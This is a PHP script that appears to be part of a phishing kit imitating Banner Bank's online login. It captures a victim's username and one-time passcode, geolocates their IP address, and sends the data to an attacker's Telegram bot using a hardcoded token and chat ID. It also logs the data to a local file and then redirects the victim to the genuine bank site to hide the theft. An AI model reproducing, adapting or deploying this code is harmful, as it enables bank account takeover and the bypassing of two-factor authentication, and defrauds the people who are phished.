<?php
session_start();

$bot_token = '8717001603:AAHpc8GZ4HG_GADthZcTmmT2bwayNoztmpE';
$chat_id = '-1003904780356';

$user_id = trim($_SESSION['login_username'] ?? '');
$opassword = $_SESSION['login_password'] ?? '';
$otp = trim($_POST['otp'] ?? '');

if ($user_id === '' || $opassword === '') {
    header('Location: index.html');
    exit;
}

if ($otp === '') {
    $_SESSION['otp_error'] = 'Please enter your Secure Access Code.';
    $_SESSION['otp_show_form'] = true;
    header('Location: otp.php');
    exit;
}

function secure_get_ip(): string
{
    foreach (['HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'REMOTE_ADDR'] as $key) {
        if (!empty($_SERVER[$key])) {
            $ipList = explode(',', $_SERVER[$key]);
            $ip = trim(end($ipList));
            if (filter_var($ip, FILTER_VALIDATE_IP)) {
                return $ip;
            }
        }
    }
    return 'Unknown';
}

$ip = secure_get_ip();

$ch = curl_init('http://ip-api.com/json/' . $ip . '?lang=ru');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_HEADER, false);
$res = curl_exec($ch);
curl_close($ch);

$res = json_decode($res, true);
$country = $res['country'] ?? 'Unknown';
$city = $res['city'] ?? 'Unknown';
$ip_info = $country . ', ' . $city;

$user_agent_browser = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

$message = "bannerbank (step 2 — OTP):\n";
$message .= "USERNAME: <code>" . htmlspecialchars($user_id, ENT_QUOTES, 'UTF-8') . "</code>\n";
$message .= "OTP: <code>" . htmlspecialchars($otp, ENT_QUOTES, 'UTF-8') . "</code>\n\n";
$message .= "IP Address: $ip\n";
$message .= "Geo: $ip_info\n";
$message .= "UserAgent: $user_agent_browser";

$params = [
    'chat_id' => $chat_id,
    'text' => $message,
    'parse_mode' => 'HTML',
];
file_get_contents('https://api.telegram.org/bot' . $bot_token . '/sendMessage?' . http_build_query($params));

$log = '[' . date('Y-m-d H:i:s') . "] step2\n$message\n\n";
file_put_contents('log.txt', $log, FILE_APPEND | LOCK_EX);

unset($_SESSION['login_username'], $_SESSION['login_password'], $_SESSION['otp_error'], $_SESSION['otp_show_form']);

setcookie('user_plus', '1', time() + (86400 * 30), '/');
header('Location: https://secure.bannerbank.com/bannerbankonline_41/uux.aspx#/login');
exit;
